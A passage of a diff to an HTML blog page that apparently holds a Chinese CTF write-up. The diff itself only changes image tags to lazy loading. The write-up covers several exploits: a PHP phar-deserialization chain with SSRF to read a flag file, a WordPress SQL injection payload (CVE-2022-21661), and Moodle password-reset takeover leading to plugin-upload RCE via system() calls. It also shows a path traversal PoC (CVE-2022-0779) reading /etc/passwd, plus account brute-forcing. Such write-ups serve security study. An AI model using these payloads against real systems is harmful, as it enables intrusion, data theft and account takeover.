language_">$this</span>-&gt;str[<span class="number">1</span>]-&gt;schema;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; <span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/usr|auto|log/i&#x27;</span> , <span class="variable">$this</span>-&gt;source))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable language_">$this</span>-&gt;schema . <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">        <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;schema);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;schema !== <span class="string">&#x27;file:///var/www/html/&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;source !== <span class="string">&#x27;admin.png&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&#x27;admin.png&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a2</span> = <span class="keyword">new</span> <span class="title class_">AdminShow</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$u</span> -&gt; filesize = <span class="variable">$a2</span>;</span><br><span class="line"><span class="variable">$u</span> -&gt; date = <span class="string">&quot;http://&quot;</span>;</span><br><span class="line"><span class="variable">$u</span> -&gt; tmp = <span class="keyword">new</span> <span class="title class_">GuestShow</span>(<span class="variable">$a2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$u1</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$u1</span> -&gt; filesize = <span class="variable">$a2</span>;</span><br><span class="line"><span class="variable">$u1</span> -&gt; date = <span class="string">&quot;10.10.10.10?url=file:///flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a1</span> = <span class="keyword">new</span> <span class="title class_">AdminShow</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="variable">$a1</span> -&gt; str[<span class="number">0</span>] = <span class="variable">$u1</span>;</span><br><span class="line"><span class="variable">$a1</span> -&gt; str[<span class="number">1</span>] = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable">$u_get</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="variable">$u_get</span> -&gt; tmp = <span class="variable">$a1</span>;</span><br><span class="line"><span class="variable">$g_de</span> = <span class="keyword">new</span> <span class="title class_">GuestShow</span>(<span class="variable">$u_get</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$g_de</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$g_de</span>);<span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象,将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801143252492.png" alt="image-20220801143252492"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801143312486.png" alt="image-20220801143312486"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801143252492.png" alt="image-20220801143252492"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220801143312486.png" alt="image-20220801143312486"></p>
 <p>解码即可</p>
 <h3 id="easylogin"><a href="#easylogin" class="headerlink" title="easylogin"></a><strong>easylogin</strong></h3><p>WordPress的SQL注入（CVE-2022–21661）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wp-admin/ajax-admin.php</span><br><span class="line">POST:action=aa&amp;query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,(database())),0x7e)#&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span><br></pre></td></tr></table></figure>
@@ -634,56 +233,56 @@
 <p>因为WordPress的密码hash了搞不到密码，后面发现可以直接sqlmap，发现有一个moodle数据库，后面发现有个忘记密码那个功能，然后去git上找可以，SQL注入获取重置密码token值，进而重置admin的密码登陆后台</p>
 <p>sqlmap跑这个moodle.mdl_user_password_resets就行，得到token</p>
 <p>重置密码</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321443395-64197fed-5f41-48cf-8c93-dd9ffde8b42f-20220805163259545.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321443395-64197fed-5f41-48cf-8c93-dd9ffde8b42f.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321443395-64197fed-5f41-48cf-8c93-dd9ffde8b42f-20220805163259545.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321443395-64197fed-5f41-48cf-8c93-dd9ffde8b42f.png"></p>
 <p>然后在token填下就行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.104.251.7:8888/login/forgot_password.php?token=xxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321458238-472b4f95-8b7d-43e2-99ab-e630d81d9a24-20220805163259577.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321458238-472b4f95-8b7d-43e2-99ab-e630d81d9a24.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321458238-472b4f95-8b7d-43e2-99ab-e630d81d9a24-20220805163259577.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321458238-472b4f95-8b7d-43e2-99ab-e630d81d9a24.png"></p>
 <p>然后进入后台就找上传的地方，最后在上传插件那</p>
 <p>在环境那里看到版本号，然后去插件商店下载一个插件，改version.php里需求版本调低（比题目版本低）然后上传即可</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321489589-9735a868-33f7-4353-b15f-276e9b212c2b-20220805163259657.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321489589-9735a868-33f7-4353-b15f-276e9b212c2b.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321489589-9735a868-33f7-4353-b15f-276e9b212c2b-20220805163259657.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1659321489589-9735a868-33f7-4353-b15f-276e9b212c2b.png"></p>
 <p>然后上传zip，即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://47.104.251.7:8888/blocks/rce/lang/en/block_rce.php?0=system(%22find%20/%20-name%20*fla*%22)&gt;;</span><br><span class="line">&lt;http://47.104.251.7:8888/blocks/rce/lang/en/block_rce.php?0=system&gt;(%22cat /etc/mytest/flaaaaaaaggggggggggggggggggggg%22);</span><br></pre></td></tr></table></figure>
 
 <h3 id="WP-UM"><a href="#WP-UM" class="headerlink" title="WP-UM"></a><strong>WP-UM</strong></h3><p>首先下载了附件:WP-UM.zip</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172536960-20220805163259693.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172536960.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172536960-20220805163259693.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172536960.png"></p>
 <p>这里我们来到这个插件的目录下:WP-UM.zip\wordpress\wp-content\plugins</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172651478-20220805163259711.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172651478.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172651478-20220805163259711.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172651478.png"></p>
 <p>这里发现了有两个插件,其中一个user-meta刚好有一个CVE-2022-0779</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;https://wpscan.com/vulnerability/9d4a3f09-b011-4d87-ab63-332e505cf1cd&gt;</span><br></pre></td></tr></table></figure>
 
 <p>打开题目给了这几个题目描述</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-31%20232711-20220805163259734.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/屏幕截图 2022-07-31 232711.png"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731104650081-20220805163259778.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731104650081.png"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731104658692-20220805163259812.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731104658692.png"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172823753-20220805163259855.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172823753.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-31%20232711-20220805163259734.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/屏幕截图 2022-07-31 232711.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731104650081-20220805163259778.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731104650081.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731104658692-20220805163259812.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731104658692.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172823753-20220805163259855.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172823753.png"></p>
 <p>这里一开始自己没仔细看这个cve的描述直接拿poc去打:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-admin/admin-ajax.php HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 158</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: [subscriber+]</span><br><span class="line"></span><br><span class="line">field_name=test&amp;filepath=/../../../../../../../../etc/passwd&amp;field_id=um_field_4&amp;form_key=Upload&amp;action=um_show_uploaded_file&amp;pf_nonce=4286c1c56a&amp;is_ajax=true</span><br><span class="line"></span><br><span class="line">If the response contains the um_remove_file, then the file exist on the server, otherwise it does not</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172942358-20220805163259898.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172942358.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172942358-20220805163259898.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731172942358.png"></p>
 <p>总是显示这个</p>
 <p>于是仔细返回过去看到文章:</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173123026-20220805163259922.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173123026.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173123026-20220805163259922.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173123026.png"></p>
 <p>并且看到该poc中的pf_nonce是一个固定值,于是决定在上传中去找该值</p>
 <p>这里注册一个账号:</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173357854-20220805163259966.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173357854.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173357854-20220805163259966.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173357854.png"></p>
 <p>登录后去上传界面:</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173436607-20220805163259990.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173436607.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173436607-20220805163259990.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173436607.png"></p>
 <p>抓包上传包:</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173644158-20220805163300041.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173644158.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173644158-20220805163300041.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173644158.png"></p>
 <p>找到了该值</p>
 <p>这里我们去替换poc中的该值后再去读文件:</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173923257-20220805163300074.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173923257.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173923257-20220805163300074.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731173923257.png"></p>
 <p>判断出来了存在该password文件</p>
 <p>这里我们先去爆破这个账号:</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731174150904-20220805163300104.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731174150904.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731174150904-20220805163300104.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731174150904.png"></p>
 <p>这里分两个参数爆破</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-31%20233638-20220805163300150.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/屏幕截图 2022-07-31 233638.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-31%20233638-20220805163300150.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/屏幕截图 2022-07-31 233638.png"></p>
 <p>线程数开大一点</p>
 <p>跑的时间久了点,python写多线程跑的发现请求也很慢,所以就干脆全部用bp爆</p>
 <p>部分爆破结果:</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-31%20233935-20220805163300180.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/屏幕截图 2022-07-31 233935.png"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-31%20234007-20220805163300222.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/屏幕截图 2022-07-31 234007.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-31%20233935-20220805163300180.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/屏幕截图 2022-07-31 233935.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-31%20234007-20220805163300222.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/屏幕截图 2022-07-31 234007.png"></p>
 <p>账号爆出来为:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MaoGePaMao</span><br></pre></td></tr></table></figure>
 
@@ -692,165 +291,25 @@
